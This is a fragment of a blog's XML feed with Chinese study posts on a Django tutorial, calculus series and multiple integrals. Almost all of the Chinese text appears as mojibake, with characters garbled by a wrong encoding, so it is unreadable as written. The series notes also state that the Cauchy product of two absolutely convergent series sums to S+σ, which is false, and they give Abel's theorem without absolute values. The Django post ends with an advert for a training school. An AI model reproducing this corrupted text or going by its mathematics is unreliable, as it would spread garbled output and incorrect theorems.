class="string">&#x27;?&#x27;</span>)[:<span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>ç„¶åè¾“å‡ºè¯•è¯• <img src="/images/2017/08/django-26.png" alt="blacsheep" /> ç„¶åæˆ‘ä»¬è¦æŠŠè¿™äº›ä¸œè¥¿ä¼ åˆ°index.htmlé‡Œé¢,é‚£ä¹ˆå°±è¦ç”¨åˆ°renderçš„contextå‚æ•°,å‚æ•°æ¥å—ä¸€ä¸ªå­—å…¸ æˆ‘ä»¬è¿™ä¹ˆå†™ <img src="/images/2017/08/django-27.png" alt="blacsheep" /> ç„¶åå»index.htmlé‡Œé¢å»æ¸²æŸ“æ¨¡ç‰ˆ,è¿™é‡Œä½¿ç”¨forå¾ªç¯ <img src="/images/2017/08/django-28.png" alt="blacsheep" /> ç„¶åçƒ­é—¨å°è¯´å°±å½¢æˆäº† <img src="/images/2017/08/django-29.png" alt="blacsheep" /> åˆ°è¿™é‡Œdjangoçš„åˆæ­¥å­¦ä¹ å°±ç»“æŸäº† è¿™é‡Œç»™æ½­å·æ•™è‚²æ‰“ä¸ªå¹¿å‘Šå§,è¿˜ç¡®å®è›®è‰¯å¿ƒçš„,è€å¸ˆè®²çš„æŒºå¥½,è€Œä¸”èµ„æºè¿˜å…è´¹ç»™æˆ‘ä»¬ä½¿ç”¨ <a href="http://www.tanzhouedu.com/">http://www.tanzhouedu.com/</a> éå¸¸æ„Ÿè°¢...æœ‰å…´è¶£çš„å¯ä»¥å»æŠ¥ä¸ªç­å­¦ä¸€å­¦</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¾®ç§¯åˆ†çº§æ•°</title>
      <link href="/2017/06/12/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%BA%A7%E6%95%B0/"/>
      <url>/2017/06/12/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%BA%A7%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>å¾®ç§¯åˆ†é©¬ä¸Šå°±è¦ç»“è¯¾äº†ï¼Œç„¶åæ„Ÿè§‰çº§æ•°è¿™ä¸€å—è¿˜æ˜¯å¾—æ€»ç»“ä¸€ä¸‹</p><h3 id="çº§æ•°çš„å®šä¹‰å’Œæ€§è´¨">$8.1çº§æ•°çš„å®šä¹‰å’Œæ€§è´¨</h3><hr /><p><strong>ç¬¬ä¸€ä¸ªé‡è¦æ¦‚å¿µï¼šçº§æ•°çš„æ¦‚å¿µ(ä»€ä¹ˆæ˜¯çº§æ•°)</strong> ä¸ªäººç†è§£ï¼Œçº§æ•°å°±æ˜¯ä¸€åˆ—æ— é™é¡¹çš„æ•°åˆ—æ¯”å¦‚u1,u2,u3,u4....un....ï¼Œå…¶ä¸­ä¸ºunä¸ºçº§æ•°çš„ä¸€èˆ¬é¡¹ï¼Œç›¸å½“äºæ•°åˆ—é‡Œé¢çš„é€šé¡¹ã€‚ <strong>ç¬¬äºŒä¸ªé‡è¦æ¦‚å¿µï¼šçº§æ•°çš„éƒ¨åˆ†å’Œ(è®°ä¸ºSn)</strong> Sn=u1+u2+u3+u4....+un,å…¶å®ç±»ä¼¼æ•°åˆ—çš„å‰né¡¹å’Œ <strong>æœ€æœ€æœ€é‡è¦çš„æ¦‚å¿µï¼šçº§æ•°çš„æ”¶æ•›å’Œå‘æ•£ï¼ˆè¿™ä¸ªä¸çŸ¥é“åé¢éƒ½ä¸ç”¨å­¦äº†ï¼‰</strong> <strong>å¦‚æœlimn-&gt;âˆSnå­˜åœ¨ï¼Œå€¼è®°ä¸ºSï¼Œé‚£ä¹ˆç§°çº§æ•°âˆ‘unæ”¶æ•›ï¼Œä¸”ç§°çº§æ•°çš„å’Œä¸ºSã€‚(åœ¨çº§æ•°å¯ä»¥éš”é¡¹ç›¸æ¶ˆçš„æ—¶å€™å¾ˆæœ‰ç”¨ï¼)</strong> åŒç†ï¼Œ<strong>å¦‚æœlimn-&gt;âˆSnä¸å­˜åœ¨ï¼Œåˆ™ç§°çº§æ•°âˆ‘unå‘æ•£ã€‚</strong> ä¹¦ä¸Šè¿˜æœ‰ä¸ªä½™é¡¹çš„æ¦‚å¿µï¼Œæˆ‘æ²¡æ€ä¹ˆåœ¨æ„ï¼Œæ„Ÿè§‰å’Œæ³°å‹’å…¬å¼é‡Œé¢çš„ä½™é¡¹ç±»ä¼¼ï¼Œå°±æ˜¯ä¸€ç§ç†æƒ³ç»“æœå’Œå®é™…çš„å·®å€¼çš„ç»å¯¹å€¼ã€‚ è‡ªå·±éšæ„åœ°ç†è§£ä¸€ä¸‹å°±okäº†ã€‚ å¥½çš„ï¼Œäº†è§£äº†ä»€ä¹ˆæ˜¯çº§æ•°ä¹‹åï¼Œ8.1çš„åé¢ä»‹ç»äº†å‡ ç§çº§æ•°çš„æ€§è´¨(éšæ„çœ‹ä¸‹ï¼Œç»“åˆå®šä¹‰ç†è§£èµ·æ¥å¾ˆç®€å•æ‰€ä»¥æˆ‘è¯´ä¸€å®šè¦å¼„æ¸…æ¥šçº§æ•°æ”¶æ•›çš„å®šä¹‰) <strong>æ€§è´¨ä¸€ï¼š</strong> å¦‚æœçº§æ•°âˆ‘unæ”¶æ•›ï¼Œå’Œè®°ä¸ºSï¼Œé‚£ä¹ˆçº§æ•°âˆ‘kunä¹Ÿæ”¶æ•›ä¸”å’Œä¸ºkSï¼Œkä¸ºå¸¸æ•°ã€‚ <strong>æ€§è´¨äºŒï¼š</strong> å¦‚æœçº§æ•°âˆ‘unå’Œçº§æ•°âˆ‘vnå‡æ”¶æ•›ï¼Œå’Œåˆ†åˆ«ä¸ºpå’Œqï¼Œé‚£ä¹ˆçº§æ•°âˆ‘(unÂ±vn)ä¹Ÿæ”¶æ•›ï¼Œä¸”å’Œä¸ºpÂ±qã€‚ <strong>æ€§è´¨ä¸‰ï¼š</strong> çº§æ•°å‰é¢å‡å»æˆ–è€…åŠ ä¸Šæœ‰é™é¡¹å¹¶ä¸æ”¹å˜çº§æ•°çš„æ•›æ•£æ€§ï¼Œä½†åœ¨çº§æ•°æ”¶æ•›çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šæ”¹å˜çº§æ•°çš„å’Œã€‚ <strong>æ€§è´¨å››ï¼š</strong> å¦‚æœä¸€ä¸ªçº§æ•°æ”¶æ•›ï¼Œé‚£ä¹ˆåŠ æ‹¬å·åçš„çº§æ•°ä¹Ÿæ”¶æ•›ã€‚<strong>åä¹‹ä¸ä¸€å®šæˆç«‹ï¼åä¹‹ä¸ä¸€å®šæˆç«‹ï¼åä¹‹ä¸ä¸€å®šæˆç«‹ï¼</strong> æ€§è´¨éšæ„çœ‹ä¸€ä¸‹å°±okï¼Œå®šä¹‰è¦å¥½å¥½ç†è§£ï¼Œ8.1å¤§æ¦‚å°±æ˜¯è¿™äº›äº†ã€‚ <strong>æœ€æœ€æœ€æœ€æœ€æœ€åä¸€ç‚¹ï¼Œçº§æ•°æ”¶æ•›çš„å¿…è¦æ¡ä»¶ï¼šå½“n-&gt;âˆæ—¶,un=0ï¼Œè¿™å°±æ˜¯è¯´ä½ ä»¥åçœ‹è§ä¸€ä¸ªçº§æ•°ï¼Œå…ˆçœ‹ä¸€çœ¼ä¸€èˆ¬é¡¹çš„æé™å°±å¯ä»¥åˆæ­¥åˆ¤æ–­çº§æ•°æ”¶æ•›çš„å¯èƒ½äº†ï¼Œæ‰€ä»¥è¿™ä¸ªè¿˜æ˜¯å¾ˆé‡è¦çš„</strong></p><h3 id="å¸¸æ•°é¡¹çº§æ•°çš„åˆ¤åˆ«æ³•">$8.2å¸¸æ•°é¡¹çº§æ•°çš„åˆ¤åˆ«æ³•</h3><p>é¦–å…ˆä¸å¾—ä¸è¯´è¿™ä¸€èŠ‚éå¸¸é‡è¦ï¼Œéå¸¸é‡è¦ï¼Œåšä¸ªæ ‡è®°ï¼Œ<strong>éå¸¸é‡è¦</strong>ï¼Œå¸¸æ•°é¡¹çº§æ•°ä¸€èˆ¬å°±æ˜¯è€ƒçš„è¿™ä¸ªäº†ï¼Œå…¶ä»–å¯èƒ½ä¼šæ¶‰åŠåˆ°åé¢çš„å¹‚çº§æ•°ï¼Œè¿™ä¸ªåé¢å†è¯´ã€‚</p><h4 id="ä¸€æ­£é¡¹çº§æ•°åˆ¤æ•›æ­£é¡¹çº§æ•°å°±æ˜¯ä¸€èˆ¬é¡¹un0çš„çº§æ•°"><strong>ä¸€ã€æ­£é¡¹çº§æ•°åˆ¤æ•›(æ­£é¡¹çº§æ•°å°±æ˜¯ä¸€èˆ¬é¡¹unâ‰¥0çš„çº§æ•°)</strong></h4><hr /><p><strong>å®šç†ä¸€ï¼šå……è¦æ¡ä»¶ï¼</strong> è®¾âˆ‘unä¸ºæ­£é¡¹çº§æ•°ï¼Œé‚£ä¹ˆâˆ‘unæ”¶æ•›çš„å……è¦æ¡ä»¶æ˜¯å®ƒçš„éƒ¨åˆ†å’Œæ•°åˆ—æœ‰ç•Œ(è¯æ˜ç”¨æé™é‡Œé¢çš„å•è°ƒæœ‰ç•Œå‡†åˆ™ï¼Œå¾ˆç®€å•) <strong>å®šç†äºŒï¼šæ¯”è¾ƒåˆ¤æ•›æ³•</strong> é€šä¿—ä¸€ç‚¹è®²å°±æ˜¯ï¼Œ <strong>å¦‚æœä¸€ä¸ªæ­£é¡¹çº§æ•°âˆ‘unçš„ä¸€èˆ¬é¡¹å°äºä¸€ä¸ªæ”¶æ•›æ­£é¡¹çº§æ•°çš„ä¸€èˆ¬é¡¹ï¼Œåˆ™çº§æ•°âˆ‘unæ”¶æ•›</strong> <strong>å¦‚æœä¸€ä¸ªæ­£é¡¹çº§æ•°âˆ‘unçš„ä¸€èˆ¬é¡¹å¤§äºä¸€ä¸ªå‘æ•£æ­£é¡¹çº§æ•°çš„ä¸€èˆ¬é¡¹ï¼Œåˆ™çº§æ•°âˆ‘unå‘æ•£</strong> éšæ„ç†è§£ä¸€ä¸‹å°±okï¼Œè¿™ä¸ªç”¨ä¹ æƒ¯äº†å¾ˆå¥½æƒ³ã€‚ ç„¶åè¿™é‡Œæå‡ºä¸€ä¸ª<strong>pçº§æ•°</strong>çš„ç‰ˆå­ï¼ŒæŒºé‡è¦çš„ã€‚ çº§æ•°âˆ‘1/npè¢«æˆä¸ºpçº§æ•°(p&gt;0)ï¼Œå®ƒæœ‰ä¸‹é¢ç‰¹ç‚¹ <strong>å½“pâ‰¤1çš„æ—¶å€™ï¼Œpçº§æ•°å‘æ•£</strong> <strong>å½“p&gt;1çš„æ—¶å€™ï¼Œpçº§æ•°æ”¶æ•›</strong> <strong>å®šç†ä¸‰ï¼šä¸€èˆ¬é¡¹ç­‰ä»·ï¼Œçº§æ•°åŒæ•›æ•£</strong> è®¾âˆ‘unå’Œâˆ‘vnéƒ½æ˜¯æ­£é¡¹çº§æ•°ï¼Œå¦‚æœä¸¤çº§æ•°çš„ä¸€èˆ¬é¡¹åœ¨nè¶‹äºæ— ç©·çš„æ—¶å€™ä¸ºåŒé˜¶æ— ç©·å°ï¼Œé‚£ä¹ˆä¸¤çº§æ•°åŒæ—¶æ”¶æ•›æˆ–å‘æ•£ã€‚ æ¯”å¦‚ä¸‹é¢è¿™é“é¢˜.... <img src="/images/2017/06/1-1.png" /> ä¸€å¼€å§‹æˆ‘æ‹¿åˆ°è¿™ä¸ªé¢˜ä¸€ç›´æƒ³ç”¨æ¯”è¾ƒåˆ¤æ•›æ³•ï¼Œä½†æ˜¯æ€»æ˜¯åˆ¤æ–­ä¸å‡ºæ¥ï¼Œåæ¥å¬è€å¸ˆè®²äº†ä¹‹åæ‰çŸ¥é“æœ‰è¿™ä¸ªæ–¹æ³•..... è¿™é“é¢˜åªè¦æŠŠçº§æ•°å–ç»å¯¹å€¼ç›´æ¥å»è¯ç»å¯¹æ”¶æ•›å°±okï¼ŒæŠŠå…¶ä¸€èˆ¬é¡¹å’Œn*(1/n)a2nåšæ¯”å€¼ç„¶åå–æé™å°±okï¼Œç„¶åå› ä¸ºtanxå’Œxåœ¨ xè¶‹äº0çš„æ—¶å€™æ˜¯ç­‰ä»·æ— ç©·å°ï¼Œæ‰€ä»¥åŸçº§æ•°å–ç»å¯¹å€¼åå’Œâˆ‘a2nåŒæ•›æ•£æ‰€ä»¥å…¶ç»å¯¹æ”¶æ•› <strong>å®šç†å››ï¼šæ¯”å€¼åˆ¤æ•›æ³•(è¾¾æœ—è´å°”åˆ¤åˆ«æ³•)</strong> å³ç”¨limn-&gt;âˆun+1/un=Ï(0â‰¤Ïâ‰¤+âˆ)æ¥åˆ¤æ–­çº§æ•°çš„æ•›æ•£æ€§ Ï&lt;1æ—¶ï¼Œçº§æ•°âˆ‘unæ”¶æ•› Ï&gt;1æ—¶ï¼Œçº§æ•°âˆ‘unå‘æ•£ Ï=1æ—¶ï¼Œæ— æ³•åˆ¤æ–­ã€‚ è¿™ä¸ªæ–¹æ³•ä¹ŸæŒºé‡è¦çš„ï¼Œè€Œä¸”åœ¨åé¢å¹‚çº§æ•°çš„æ•›æ•£åˆ¤æ–­é‡Œé¢ä¹Ÿæœ‰æ¨è®ºï¼Œå¤šçœ‹çœ‹ä¹Ÿä¸æ˜¯å¾ˆéš¾æŒæ¡ã€‚ <strong>å®šç†äº”ï¼šæ ¹å€¼åˆ¤æ•›æ³•(æŸ¯è¥¿åˆ¤æ•›æ³•)</strong> ä¹Ÿå³æŠŠçº§æ•°ä¸€èˆ¬é¡¹å¼€næ¬¡æ–¹ç„¶åå–n-&gt;âˆçš„æé™æ¥åˆ¤æ–­æ•›æ•£æ€§ è®¾æé™ä¸ºÏï¼Œé‚£ä¹ˆåŒæ ·æœ‰ Ï&lt;1æ—¶ï¼Œçº§æ•°âˆ‘unæ”¶æ•› Ï&gt;1æ—¶ï¼Œçº§æ•°âˆ‘unå‘æ•£ Ï=1æ—¶ï¼Œæ— æ³•åˆ¤æ–­ã€‚ Â  <strong>åˆ°è¿™é‡Œæ­£é¡¹çº§æ•°çš„åˆ¤æ•›æ–¹æ³•å°±è®²å®Œäº†ï¼è¿™ä¸ªå¾ˆé‡è¦ï¼Œè¦å¤šçœ‹</strong></p><h4 id="äºŒäº¤é”™çº§æ•°çš„åˆ¤æ•›æ³•"><strong>äºŒã€äº¤é”™çº§æ•°çš„åˆ¤æ•›æ³•</strong></h4><hr /><p>ä»€ä¹ˆæ˜¯äº¤é”™çº§æ•°ï¼Ÿ äº¤é”™çº§æ•°å°±æ˜¯ âˆ‘(-1)n-1unæˆ–âˆ‘(-1)nunè¿™ç§çš„çº§æ•° å…¶æ”¶æ•›å¿…é¡»å…·å¤‡ä¸¤ä¸ªæ¡ä»¶ 1ã€æ»¡è¶³çº§æ•°æ”¶æ•›çš„é€šç”¨å¿…è¦æ¡ä»¶-&gt;å½“ä¸€èˆ¬é¡¹çš„n-&gt;âˆçš„æ—¶å€™æé™ä¸º0 2ã€çº§æ•°çš„unå•è°ƒä¸å¢ã€‚ è¿™é‡Œæœ‰ä¸ªç»å…¸çš„åˆ©ç”¨è¿™ä¸ªç»“è®ºçš„é¢˜ç›® <img src="/images/2017/06/1-1-1.png" /> è¿™é‡Œæ­£é¡¹çº§æ•°anå•è°ƒå‡å°‘ï¼Œä½†æ˜¯äº¤é”™çº§æ•°å´å‘æ•£ï¼Œæ‰€ä»¥anæœ€åä¸æ˜¯è¶‹è¿‘äº0è€Œæ˜¯è¶‹äºä¸€ä¸ªæ­£æ•°ã€‚ä¹‹åå†ç”¨æŸ¯è¥¿åˆ¤æ•›æ³•ï¼Œå–ä¸ª1/næ¬¡æ–¹ä¹‹å1/(an+1)å°äº1ï¼Œæ‰€ä»¥è¯¥æœ€åå¾—å‡ºç»“è®ºï¼Œé¢˜ä¸­çº§æ•°æ”¶æ•›ã€‚ å…¶ä»–çš„é¢˜ç›®æ„Ÿè§‰å°±æ˜¯ç¡¬å¥—ç»“è®ºæ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚</p><h4 id="ä¸‰ç»å¯¹æ”¶æ•›å’Œæ¡ä»¶æ”¶æ•›">ä¸‰ã€ç»å¯¹æ”¶æ•›å’Œæ¡ä»¶æ”¶æ•›</h4><hr /><p>è¿™ä¸€éƒ¨åˆ†ä¸€å¼€å§‹å°±æ‹¿å‡ºä¸€ä¸ªç»“è®ºï¼š <strong>å®šç†7ï¼šå¦‚æœä¸€ä¸ªçº§æ•°çš„ç»å¯¹å€¼çº§æ•°(ç»å¯¹å€¼çº§æ•°å°±æ˜¯æŠŠæŸä¸ªçº§æ•°çš„ä¸€èˆ¬é¡¹å–ç»å¯¹å€¼åå¾—åˆ°çš„çº§æ•°)æ”¶æ•›ï¼Œé‚£ä¹ˆå®ƒçš„åŸçº§æ•°ä¹Ÿæ”¶æ•›ã€‚</strong> è¿™ä¸ªç»“è®ºéå¸¸éå¸¸çš„æœ‰ç”¨ï¼Œå®ƒå¯ä»¥æŠŠä¸€ä¸ªä»»æ„çº§æ•°è½¬ä¸ºåˆ¤æ–­æ­£é¡¹çº§æ•°ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨æ­£é¡¹çº§æ•°åˆ¤æ•›æ³•äº†ã€‚ é¡ºä¾¿åœ¨è¿™é‡Œæå‡ºä¸€ä¸ªå¸¸ç”¨èŒƒä¾‹ï¼šçº§æ•°âˆ‘1/nå’Œâˆ‘(-1)n-1(1/n),è¿™é‡Œå‰è€…æ˜¯å‘æ•£çš„ï¼Œåè€…æ˜¯æ”¶æ•›çš„ï¼Œè¿™ä¸ªç»“è®ºè›®å¸¸ç”¨çš„ã€‚ åé¢ä»‹ç»äº†ä¸€ä¸ªå®šä¹‰ï¼š<strong>å¦‚æœä¸€ä¸ªçº§æ•°å®ƒçš„ç»å¯¹å€¼çº§æ•°æ”¶æ•›ï¼Œé‚£ä¹ˆç§°è¿™ä¸ªçº§æ•°ç»å¯¹æ”¶æ•›ï¼Œå¦‚æœä¸€ä¸ªçº§æ•°çš„ç»å¯¹å€¼çº§æ•°å‘æ•£ï¼Œè€Œçº§æ•°è‡ªèº«æ”¶æ•›ï¼Œé‚£ä¹ˆç§°è¿™ä¸ªçº§æ•°æ¡ä»¶æ”¶æ•›ã€‚</strong> è¿™ä¸ªå®šä¹‰æ²¡å•¥ç”¨ï¼Œåªæ˜¯ç”¨æ¥åšé¢˜å’Œç§°å‘¼ã€‚ <strong>Tips:åœ¨æœ‰äº†æ¡ä»¶æ”¶æ•›å’Œç»å¯¹æ”¶æ•›ä¹‹åï¼Œåˆ¤æ–­ä¸€ä¸ªéæ­£é¡¹çº§æ•°çš„æ•›æ•£æ€§çš„æ—¶å€™å°±ä¸€å®šè¦è¯´æ˜æ˜¯ç»å¯¹æ”¶æ•›è¿˜æ˜¯æ¡ä»¶æ”¶æ•›äº†ã€‚</strong> æ¡ä»¶æ”¶æ•›çš„å®šç†8ï¼Œ9æˆ‘è§‰å¾—ä¸æ˜¯å¾ˆé‡è¦(èµ·ç æš‚æ—¶è¿˜ä¸è§‰å¾—.....),æ‰€ä»¥æˆ‘å°±ç®€å•çš„åˆ—å‡ºæ¥å§ï¼Œå¤§å®¶çœ‹ä¸‹å°±å¯ä»¥äº†ã€‚ å®šç†8ï¼šç»å¯¹æ”¶æ•›çº§æ•°ä¸å› ä¸ºæ”¹å˜é¡¹çš„ä½ç½®è€Œæ”¹å˜å®ƒçš„å’Œ å®šç†9ï¼šè®¾çº§æ•°âˆ‘unå’Œâˆ‘vnéƒ½æ˜¯ç»å¯¹æ”¶æ•›çš„ï¼Œå…¶å’Œåˆ†åˆ«ä¸ºSå’ŒÏƒï¼Œé‚£ä¹ˆå®ƒä»¬çš„æŸ¯è¥¿ä¹˜ç§¯ <img src="/images/2017/06/1-2.png" />ä¹Ÿç»å¯¹æ”¶æ•›ï¼Œä¸”å’Œä¸ºS+Ïƒã€‚</p><h3 id="å¹‚çº§æ•°">$8.3å¹‚çº§æ•°</h3><hr /><p>éå¸¸éå¸¸éå¸¸é‡è¦çš„ä¸€èŠ‚ï¼Œå¯ä»¥è¯´æ˜¯çº§æ•°ä¸€ç« çš„çµé­‚äº† é¦–å…ˆ<strong>å‡½æ•°é¡¹çº§æ•°çš„å®šä¹‰</strong>: ç»™å®šä¸€ä¸ª<strong>åŒºé—´I</strong>ä¸Šå®šä¹‰çš„å‡½æ•°åˆ—ï¼Œu1(x),u2(x),u3(x)....un(x)....,åˆ™ç”±è¯¥å‡½æ•°åˆ—æ‰€æ„æˆçš„è¡¨è¾¾å¼âˆ‘un(x)å°±æ˜¯<strong>å®šä¹‰åœ¨âˆ‘unåŒºé—´I</strong>ä¸Šçš„å‡½æ•°é¡¹çº§æ•°ã€‚ <strong>è¯´ç™½äº†å°±æ˜¯æŠŠçº§æ•°çš„é¡¹æ”¹æˆå’Œxæœ‰å…³çš„å‡½æ•°ï¼Œæ„æˆçš„çº§æ•°å°±æ˜¯å‡½æ•°é¡¹çº§æ•°ã€‚</strong> ç„¶åå®šä¹‰äºŒæ˜¯å…³äºæ”¶æ•›ç‚¹çš„ï¼Œå°±æ˜¯åœ¨æŸä¸ªå®šä¹‰åŸŸå†…éƒ¨çš„ç‚¹x0ï¼Œå¦‚æœâˆ‘un(x0)æ”¶æ•›ï¼Œé‚£ä¹ˆç§°x0ä¸ºçº§æ•°çš„æ”¶æ•›ç‚¹ï¼Œå¦‚æœå‘æ•£å°±æ˜¯å‘æ•£ç‚¹ï¼›å…¨ä½“æ”¶æ•›ç‚¹çš„é›†åˆç§°ä¸ºå‡½æ•°é¡¹çº§æ•°çš„æ”¶æ•›åŸŸã€‚ ä¸Šé¢æ‰€æœ‰å’Œå®šä¹‰åŸŸç›¸å…³çš„ä¸œè¥¿éƒ½é‡ç‚¹æ ‡è®°äº†ï¼Œ<strong>ä»¥ååœ¨å‡½æ•°é¡¹çº§æ•°é‡Œé¢ï¼Œæ‰€æœ‰çš„ç»“æœï¼Œéƒ½å¿…é¡»å¸¦ä¸Šç›¸åº”çš„åŸŸï¼Œå¦åˆ™ç®—ç»“æœä¸å®Œæ•´ï¼</strong> <strong>ç„¶ååˆ°å¹‚çº§æ•°</strong> å®šä¹‰ï¼š<strong>å½¢å¦‚âˆ‘anxn=a0+a1x+a2x2+...anxn...çš„å‡½æ•°é¡¹çº§æ•°ç§°ä¸ºå¹‚çº§æ•°ï¼Œå…¶ä¸­a0ï¼Œa1ï¼Œa2...anè¢«ç§°ä¸ºå¹‚çº§æ•°çš„ç³»æ•°ã€‚</strong> ç®€å•æ˜“æ‡‚ï¼Œå°±æ˜¯å‡½æ•°é¡¹éƒ½ä¸ºå¹‚å‡½æ•°çš„çº§æ•°å°±æ˜¯å¹‚çº§æ•° ç„¶åä¸€ä¸ªä¸èµ·çœ¼çš„é‡è¦ç»“è®º <strong>å®šç†ä¸€-&gt;é˜¿è´å°”å®šç†:</strong> <strong>å¦‚æœå¹‚çº§æ•°åœ¨ç‚¹x0å¤„æ”¶æ•›ï¼Œé‚£ä¹ˆå½“x&lt;x0çš„æ—¶å€™å¹‚çº§æ•°ä¹Ÿæ”¶æ•›</strong> <strong>å¦‚æœå¹‚çº§æ•°åœ¨ç‚¹x0å¤„å‘æ•£ï¼Œé‚£ä¹ˆå½“x&gt;x0çš„æ—¶å€™å¹‚çº§æ•°ä¹Ÿå‘æ•£</strong> ä¸‹é¢å®šç†äºŒï¼Œè¿™ä¸ªçœŸçš„<strong>å¾ˆé‡è¦å¾ˆé‡è¦</strong> <img src="/images/2017/06/1-3.png" /> å…¶ä¸­è¿™ä¸ªRæ˜¯æ”¶æ•›åŠå¾„ï¼Œä¹Ÿå°±æ˜¯è¯´çº§æ•°åœ¨(-R,R),[-R,R),(-R,R]æˆ–[-R,R]ä¸Šé¢æ”¶æ•›ã€‚ä¸¤ä¸ªç«¯ç‚¹è¦é å¸¦è¿›å»æ¥åˆ¤æ–­ã€‚ æœ‰äº†è¿™ä¸ªç»“è®ºï¼Œå‡ ä¹æ‰€æœ‰çš„é¢˜ç›®éƒ½æ˜¯n+1é¡¹æ¯”ç¬¬né¡¹ï¼Œçœ‹æ”¶æ•›åŠå¾„ï¼Œå¦‚æœæœ‰næ¬¡æ–¹çš„è¯ï¼Œé‚£å°±å¼€ä¸ªnæ¬¡æ–¹ï¼Œç„¶åä¾æ—§å¾—å‡ºæ”¶æ•›åŒºé—´</p><hr /><p>å¹‚çº§æ•°çš„åŠ å‡ä¸€å—æˆ‘è§‰å¾—ä¸æ˜¯å¾ˆé‡è¦ï¼Œæ­¤å¤„çœç•¥ã€‚ã€‚ã€‚ å’Œå‡½æ•°çš„æ€§è´¨ï¼Œè¿™ä¸ªç›´æ¥æ¶‰åŠåˆ°äº†å¹‚çº§æ•°æ±‚å’Œäº†....å¹‚çº§æ•°æ±‚å’Œä¸»è¦æ¶‰åŠä¸‰ä¸ªæ–¹æ³• ç¬¬ä¸€ä¸ªï¼š<strong>è¿ç»­</strong>-&gt;å¹‚çº§æ•°çš„æ”¶æ•›åŒºé—´çš„ç«¯ç‚¹å¦‚æœæ”¶æ•›ï¼Œé‚£ä¹ˆå…¶å’Œå‡½æ•°å°±åœ¨è¿™ä¸€ç‚¹è¿ç»­ã€‚ ç¬¬äºŒä¸ªï¼š<strong>æ±‚å¯¼</strong>-&gt;<strong>ç®€å•ç‚¹è¯´å°±æ˜¯å¹‚çº§æ•°çš„å’Œå‡½æ•°å¯ä»¥ç”±è¯¥çº§æ•°çš„ä¸€èˆ¬é¡¹æ±‚å¯¼åæ±‚å’Œï¼Œç„¶åå¯¹ç»“æœç§¯åˆ†ç®—å‡ºæ¥ã€‚</strong> ç¬¬ä¸‰ä¸ªï¼š<strong>ç§¯åˆ†</strong>-&gt;åŒäºŒï¼Œå°±æ˜¯<strong>å¯ä»¥å…ˆç§¯åˆ†å†æ±‚å’Œæœ€åå†å¯¹ç»“æœæ±‚å¯¼å¾—å‡ºå’Œå‡½æ•°ã€‚</strong> è¿™ä¸‰ä¸ªç»“è®ºç”¨çš„ç†Ÿä¸ç†Ÿï¼Œç›´æ¥å†³å®šäº†èƒ½ä¸èƒ½æ­£ç¡®çš„æ±‚å‡ºå¹‚çº§æ•°çš„å’Œå‡½æ•°ï¼éœ€è¦å¤šåŠ ç»ƒä¹ ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å¾®ç§¯åˆ†å¤§ç‰©ç­‰ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¾®ç§¯åˆ†å°ç»“</title>
      <link href="/2017/05/10/%E5%BE%AE%E7%A7%AF%E5%88%86%E5%B0%8F%E7%BB%93/"/>
      <url>/2017/05/10/%E5%BE%AE%E7%A7%AF%E5%88%86%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>å¾®ç§¯åˆ†ç°åœ¨å·²ç»å­¦äº†è¿™ä¹ˆå¤šç§ç§¯åˆ†äº†ï¼Œå…ˆæ€»ç»“ä¸€ä¸‹ Â </p><h4 id="äºŒé‡ç§¯åˆ†">äºŒé‡ç§¯åˆ†</h4><p>æ¯”è¾ƒç®€å•ï¼Œç¡®å®šå¥½åŒºåŸŸå°±okã€‚ <strong>è€ƒç‚¹</strong>:æ³¨æ„ä¸€ç§äº¤æ¢ç§¯åˆ†é¡ºåºçš„è¯æ˜é¢˜ï¼Œæˆ–è€…å•çº¯çš„è®¡ç®—é¢˜ <strong>å‡ ä½•æ„ä¹‰</strong>:ç›´æ¥ç†è§£éƒ½æ²¡é—®é¢˜ï¼ŒæŠŠåæ ‡é¢æ¨ªæ”¾ï¼Œç„¶åè¢«ç§¯å‡½æ•°å’Œå¾®å…ƒçš„ä¹˜ç§¯å°±æ˜¯ä¸€ä¸ªå°æŸ±çš„ä½“ç§¯ï¼Œç§¯åˆ†å°±æ˜¯ä»¥è¢«ç§¯å‡½æ•°ä¸ºé¡¶çš„å‡ ä½•ä½“ä½“ç§¯ã€‚ <strong>è®¡ç®—æ–¹æ³•</strong>:å¹³é¢åæ ‡xï¼Œyç›´æ¥è§£ï¼Œæˆ–è€…ä½¿ç”¨æåæ ‡ç®€åŒ–è¿ç®—(åˆ«å¿˜äº†ä¹˜r)ã€‚ <strong>è¾ƒå†·é—¨</strong>:äºŒé‡ç§¯åˆ†çš„æ¢å…ƒ(ä¹˜é›…å¯æ¯”è¡Œåˆ—å¼) <strong>æŠ€å·§</strong>: 1ã€æ³¨æ„å¥‡å¶æ€§ï¼Œå¯å¤§é‡ç®€åŒ–è¿ç®— 2ã€è½®æ¢å¯¹ç§°æ€§</p><h4 id="ä¸‰é‡ç§¯åˆ†">ä¸‰é‡ç§¯åˆ†</h4><p>ç¨éš¾ä¸€ç‚¹ï¼Œä½†ä¹Ÿä¸æ˜¯å¾ˆéš¾ã€‚ <strong>è€ƒç‚¹</strong>:ä¸€èˆ¬éƒ½æ˜¯è®¡ç®—(ä¹Ÿå¯èƒ½æ˜¯æˆ‘è§é¢˜å°‘....) <strong>å‡ ä½•æ„ä¹‰</strong>:ä¸€ä¸ªç©ºé—´å‡ ä½•ä½“çš„ä¸€ä¸ªä½“ç§¯å¾®å…ƒå’Œè¢«ç§¯å‡½æ•°çš„ä¹˜ç§¯ç§¯åˆ†å°±æ˜¯ä¸€ä¸ªä½“ç§¯å¾®å…ƒçš„è´¨é‡(å‡å¦‚æŠŠè¢«ç§¯å‡½æ•°å½“å¯†åº¦å‡½æ•°)ï¼Œç»“æœå°±æ˜¯å¯†åº¦å‡½æ•°ä¸ºfçš„å‡ ä½•ä½“çš„è´¨é‡ã€‚(è¯´çš„å¯èƒ½ä¸å¤ªæ¸…æ¥šï¼Œè‡ªå·±ä½“ä¼šä¸€ä¸‹) 